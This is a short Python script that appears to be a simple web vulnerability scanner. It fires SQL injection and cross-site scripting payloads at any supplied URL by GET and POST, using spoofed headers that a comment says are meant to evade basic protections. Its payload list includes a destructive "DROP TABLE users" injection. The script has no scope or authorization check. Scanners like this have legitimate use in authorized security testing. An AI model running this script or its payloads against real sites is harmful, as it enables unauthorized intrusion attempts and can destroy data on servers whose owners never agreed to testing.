import requests
from urllib.parse import urljoin
import time

# Define payloads
PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1 --",
        "' OR '1'='1#",
        "' OR '1'='1/*",
        "'; DROP TABLE users;--",
        "' UNION SELECT null, username, password FROM users --"
    ],
    "xss": [
        '<script>alert("XSS")</script>',
        '" onmouseover="alert(\'XSS\')"',
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
    ]
}

# Headers to evade basic protections
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Referer": "https://google.com",
    "Connection": "keep-alive"
}

# Function to scan for SQL Injection
def scan_sql_injection(url):
    vulnerabilities = []
    for payload in PAYLOADS["sql_injection"]:
        for method in ["GET", "POST"]:
            params = {"id": payload}
            try:
                if method == "GET":
                    response = requests.get(url, params=params, headers=HEADERS, timeout=5)
                else:
                    response = requests.post(url, data=params, headers=HEADERS, timeout=5)
                
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    vulnerabilities.append(f"SQL Injection Found: {url} (Payload: {payload})\n")

            except requests.exceptions.RequestException:
            	pass
                #vulnerabilities.append(f"Failed to connect to {url}")
            time.sleep(0.5) 
    return vulnerabilities

# Function to scan for XSS
def scan_xss(url):
    vulnerabilities = []
    for payload in PAYLOADS["xss"]:
        for method in ["GET", "POST"]:
            params = {"q": payload}
            try:
                if method == "GET":
                    response = requests.get(url, params=params, headers=HEADERS, timeout=5)
                else:
                    response = requests.post(url, data=params, headers=HEADERS, timeout=5)

                if payload in response.text:
                    vulnerabilities.append(f"XSS Found: {url} (Payload: {payload})\n")

            except requests.exceptions.RequestException:
            	pass
                #vulnerabilities.append(f"Failed to connect to {url}")
            time.sleep(0.5) 
    return vulnerabilities


def run_scanner(target_url):
    print(f"Scanning {target_url} for vulnerabilities...\n")

    sql_results = scan_sql_injection(target_url)
    xss_results = scan_xss(target_url)

    all_results = sql_results + xss_results
    if all_results:
        return all_results
    else:
        return "No vulnerabilities found."
